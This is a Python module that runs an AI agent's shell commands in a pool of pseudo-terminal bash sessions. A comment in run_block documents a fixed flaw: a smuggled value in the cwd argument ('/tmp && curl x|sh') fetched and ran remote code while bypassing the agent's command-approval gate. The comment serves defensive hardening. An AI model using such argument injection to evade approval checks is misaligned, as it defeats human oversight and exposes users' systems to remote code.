# SPDX-License-Identifier: GPL-3.0-or-later
# Copyright (C) 2024-2026 Eric Bintner and Halbert Contributors
"""Agent terminal pool — PTY-backed bash sessions for agent run_command.

The pool owns 'agent-pool' kind sessions in the TerminalSessionManager.
executor._run_command asks the pool for a session that is not busy
(no open block) and not interactive; spawns one up to the cap; falls
back to the subprocess path at cap or when the session is interactive.

See plan-b-contracts.md section 6.
"""
from __future__ import annotations

import asyncio
import logging
import os
import shlex
import time
import uuid
from typing import Dict, Optional, Tuple

from .pty import PTYSession
from .bounded_output import BoundedOutput
from .session_manager import TerminalSessionManager, AtCapacityError
from .shell_integration import OSCParser, BlockBoundary
from .redact import redact
from .terminal_bridge import publish_terminal_event

logger = logging.getLogger("halbert.streaming.agent_pool")

#: A block still open after this long stops being a passing detail and
#: becomes a thing the machine is doing: the conversation promotes it to a
#: task card with a live tile. Below it, a command is a one-line result.
#: 2 s is the number plan-b-contracts §7/§13 uses for both halves of that
#: decision, and the frontend's short-block branch reads the same value.
PROMOTE_AFTER_SECONDS = 2.0

_POOL_SHELL = "bash --norc --noprofile"


class TerminalPool:
    """Pool of PTY-backed bash sessions for agent run_command."""

    def __init__(self, manager: TerminalSessionManager, *, cap: int = 3):
        self._manager = manager
        self._cap = cap
        self._sessions: Dict[str, PTYSession] = {}

    async def acquire(self) -> Optional[Tuple[str, PTYSession]]:
        """Return an idle, non-interactive pool session, or spawn one.

        Returns None when at cap and all sessions are busy/interactive
        (caller falls back to subprocess).
        """
        # Drop sessions that are gone before counting against the cap. The
        # loop below skips dead sessions but left them in the dict, so once
        # the idle reaper had collected `cap` of them the length check below
        # was permanently true and every acquire returned None -- the pool
        # died about fifteen minutes after the dashboard went quiet and never
        # came back, silently falling back to subprocess for the rest of the
        # process's life.
        for sid in [s for s, sess in self._sessions.items() if not sess.is_alive()]:
            self._sessions.pop(sid, None)
            logger.debug("pool: dropped dead session %s", sid)

        # Look for an existing idle, non-interactive session
        for sid, session in list(self._sessions.items()):
            if self._manager._block_open.get(sid, False):
                continue
            if not session.is_alive():
                continue
            # Skip interactive sessions (alt-screen or needs-input)
            if self._manager.is_interactive(sid):
                continue
            self._manager.set_block_open(sid, True)
            return (sid, session)

        # Try to spawn a new one
        if len(self._sessions) >= self._cap:
            return None

        try:
            sid = await self._manager.spawn(
                _POOL_SHELL,
                kind="agent-pool",
                watched=False,
                echo=False,
            )
        except AtCapacityError:
            return None

        session = self._manager.get(sid)
        if session is None:
            return None

        # Enable job control in the pool shell
        try:
            await session.write_stdin("set -m\n")
            await asyncio.sleep(0.05)
        except Exception:
            pass

        self._sessions[sid] = session
        self._manager.set_block_open(sid, True)
        return (sid, session)

    @staticmethod
    async def _promote_after(delay: float, still_open, payload: Dict) -> None:
        """Publish ``payload`` after ``delay``, if ``still_open()`` says to.

        Split out of ``run_block`` so the decision is testable without racing
        a real PTY, and because a fire-and-forget task nobody awaits must not
        be able to raise: an exception here would surface only as asyncio's
        "exception was never retrieved" at interpreter shutdown, attached to
        no request and explaining nothing.
        """
        try:
            await asyncio.sleep(delay)
            if still_open():
                publish_terminal_event(payload)
        except asyncio.CancelledError:
            raise
        except Exception as e:  # pragma: no cover - defensive
            logger.warning("promotion timer failed: %s", e)

    async def run_block(
        self,
        command: str,
        *,
        cwd: Optional[str] = None,
        timeout: float = 30.0,
    ) -> Optional[Dict]:
        """Run a single command as a block in a pool session.

        Returns a dict with block_id, session_id, exit_code, output_head,
        output_tail, duration, started_at, ended_at. Returns None if no
        session could be acquired.
        """
        acquired = await self.acquire()
        if acquired is None:
            return None
        sid, session = acquired
        block_id = str(uuid.uuid4())
        started_monotonic = time.monotonic()
        started_at = time.time()

        # Publish terminal_spawn event (Plan B: B6).
        publish_terminal_event({
            "kind": "spawn",
            "terminal_session_id": sid,
            "command": command,
            "pid": session.pid or 0,
            "cwd": cwd,
            "sandboxed": False,
            "attach": "ws",
            "owner": "agent",
            "block_id": block_id,
        })
        # ...and the block itself. The spawn creates the session on the
        # frontend; this attaches a block record to it, which is what the
        # conversation renders and what a promotion later flips to a task
        # card. Published after the spawn on purpose: a block for a session
        # the store has not seen yet is dropped.
        publish_terminal_event({
            "kind": "block",
            "terminal_session_id": sid,
            "block_id": block_id,
            "command": command,
            "owner": "agent",
            "interactive": False,
        })

        # Arm the promotion. The timer races the command: whichever wins says
        # what kind of thing this was.
        #
        # ``block_closed`` is declared here, ahead of the drain that sets it,
        # so the timer can read it. Cancelling in the finally below is not
        # enough on its own: between the D marker arriving and that cancel,
        # the pool decodes the output, splits head and tail, and redacts both.
        # A timer expiring inside that window is already scheduled, and the
        # cancel comes too late -- so it also looks before it speaks.
        block_closed = False
        promote_task = asyncio.create_task(self._promote_after(
            PROMOTE_AFTER_SECONDS,
            lambda: not block_closed,
            {
                "kind": "block_promote",
                "terminal_session_id": sid,
                "block_id": block_id,
                "command": command,
                "owner": "agent",
                "interactive": False,
            },
        ))

        # Build the block command with OSC 133 markers.
        # The command runs in a subshell so `exit` doesn't kill the pool shell.
        # shlex.quote, not interpolation. `cwd` is a tool argument and the
        # safety framework classifies only `command`, so an unquoted cwd was
        # a complete bypass of the approval gate: run_command(command="ls",
        # cwd="/tmp && curl x|sh") classified SAFE / "Directory listing" /
        # no confirmation, and the whole line reached bash. The pre-pool
        # substrate was never exposed to this -- create_subprocess_shell
        # takes cwd as a real chdir argument, not as shell text -- so the
        # hole opened when the pool became the production path.
        #
        # `eval` on a quoted string, not interpolation of the command either.
        # Everything here is spliced onto ONE line, so any command whose text
        # can swallow the rest of that line swallows the closing paren and the
        # D marker with it. `echo hi  # note` left bash sitting at a
        # continuation prompt: the block hung for the full timeout, returned
        # exit -1 with no output, and took its pool session down with it.
        # Heredocs and unterminated quotes failed the same way, for the same
        # reason. Passing the command as a single-quoted argument to `eval`
        # keeps the outer line syntactically complete whatever the command
        # contains -- a `#` then comments only within the evaluated script, a
        # heredoc gets its real newlines, and a genuine syntax error becomes a
        # non-zero exit with the D marker still printed instead of a hang.
        cwd_prefix = f"cd {shlex.quote(cwd)} && " if cwd else ""
        block_cmd = (
            f"printf '\\x1b]133;C;id={block_id}\\x07';"
            f"({cwd_prefix}eval {shlex.quote(command)});"
            f"printf '\\x1b]133;D;%d;id={block_id}\\x07' \"$?\"\n"
        )

        # From here on the session is marked busy (acquire() set block_open),
        # and the reaper deliberately never reclaims an agent-pool session
        # with an open block. So every exit from this point -- including the
        # attach, the replay wait and the first write, all of which used to
        # sit outside the try -- has to clear the flag, or the slot is busy
        # for the life of the process and immune to the reaper too. Three of
        # those and a cap-3 pool is permanently dead (R04-F3).
        released = False

        try:
            # Attach a fanout queue to read output
            q = await session.attach()
            # Skip the replay item
            replay = await asyncio.wait_for(q.get(), timeout=5.0)

            # Set up OSC parser to detect block boundaries
            parser = OSCParser()
            block_output = BoundedOutput()
            exit_code: Optional[int] = None

            # Write the command
            await session.write_stdin(block_cmd)

            async def _drain_until_closed():
                """Consume queue items until the D marker is seen or EOF."""
                nonlocal exit_code, block_closed
                while not block_closed:
                    item = await q.get()
                    if item is None:
                        break
                    if isinstance(item, tuple):
                        continue  # replay
                    out = parser.feed(item)
                    block_output.extend(out.block_bytes)
                    for b in out.boundaries:
                        if b.kind == "D" and b.block_id == block_id:
                            exit_code = b.exit_code
                            block_closed = True
                            break

            try:
                # Wall-clock timeout for the D marker
                await asyncio.wait_for(_drain_until_closed(), timeout=timeout)
            except asyncio.TimeoutError:
                # Command timed out — send ETX (Ctrl-C)
                try:
                    await session.write_stdin("\x03")
                except Exception:
                    pass
                # Grace-wait 2s for D marker after ETX
                try:
                    await asyncio.wait_for(_drain_until_closed(), timeout=2.0)
                except asyncio.TimeoutError:
                    pass
                if not block_closed:
                    # Kill and evict
                    self._manager.kill(sid)
                    self._evict(sid)
                    exit_code = -1
            finally:
                session.detach(q)

            ended_at = time.time()
            duration = time.monotonic() - started_monotonic

            # Build output head (first 20 lines) and tail (last 4 KiB)
            output_bytes = block_output.bytes()
            output_text = output_bytes.decode("utf-8", errors="replace")
            lines = output_text.split("\n")
            head = "\n".join(lines[:20])
            tail = output_text[-4096:] if len(output_text) > 4096 else output_text

            # How much fell between the two halves. The frontend receives head
            # and tail and nothing else, so it cannot work this out: neither
            # half knows the length of what sits between them. Without a
            # number the card can only print a bare "…", which says something
            # was cut without saying how much -- and a reader cannot tell
            # "this is all of it" from "there is more".
            total_lines = len(lines)
            head_lines = min(20, total_lines)
            tail_line_count = len(tail.split("\n")) if tail else 0
            elided_lines = max(0, total_lines - head_lines - tail_line_count)
            # Head and tail overlap for anything short enough to fit in both,
            # which is the common case; the max() above already floors that to
            # zero rather than reporting a negative elision.

            # Redact
            head, head_redacted = redact(head)
            tail, tail_redacted = redact(tail)

            # Publish terminal_complete event (Plan B: B6) -- after the output
            # exists, so it can carry it. The conversation needs three things
            # to render a finished command as a one-line result instead of a
            # generic card: the exit code, how long it took, and the block's
            # own output. The last of those cannot come from the session's
            # scrollback: a pool session is reused, so its buffer holds every
            # command it has ever run.
            #
            # Redacted head/tail are what ship, never the raw bytes.
            publish_terminal_event({
                "kind": "complete",
                "terminal_session_id": sid,
                "exit_code": exit_code if exit_code is not None else -1,
                "block_id": block_id,
                "duration": duration,
                "output_head": head,
                "output_tail": tail,
                # Zero rather than absent: "nothing was cut" is a fact worth
                # stating, and an absent field renders the same as an unknown.
                "output_elided_lines": elided_lines,
                "output_total_lines": total_lines,
            })

            # Released here on the success path so the slot is free before the
            # result is built; the finally below is the backstop for every
            # other exit.
            self._manager.set_block_open(sid, False)
            released = True

            return {
                "block_id": block_id,
                "session_id": sid,
                "exit_code": exit_code if exit_code is not None else -1,
                "output_head": head,
                "output_tail": tail,
                "output_elided_lines": elided_lines,
                "duration": duration,
                "started_at": started_at,
                "ended_at": ended_at,
                "redacted": head_redacted or tail_redacted,
            }
        finally:
            promote_task.cancel()
            if not released:
                self._manager.set_block_open(sid, False)

    def release(self, session_id: str) -> None:
        """Mark a session as no longer busy (block closed). Does not kill."""
        if session_id in self._sessions:
            self._manager.set_block_open(session_id, False)

    def _evict(self, session_id: str) -> None:
        """Remove a session from the pool's tracking (called on kill/evict)."""
        self._sessions.pop(session_id, None)

    async def shutdown(self) -> None:
        """Kill all pool sessions."""
        for sid in list(self._sessions.keys()):
            self._manager.kill(sid)
        self._sessions.clear()


# ---------------------------------------------------------------------------
# Global singleton
# ---------------------------------------------------------------------------

_pool: Optional[TerminalPool] = None


def get_terminal_pool() -> TerminalPool:
    """Get the global TerminalPool (created lazily)."""
    global _pool
    if _pool is None:
        from .session_manager import get_terminal_manager
        _pool = TerminalPool(get_terminal_manager(), cap=3)
    return _pool


def set_terminal_pool(pool: Optional[TerminalPool]) -> None:
    """Inject/replace the global pool (for tests)."""
    global _pool
    _pool = pool
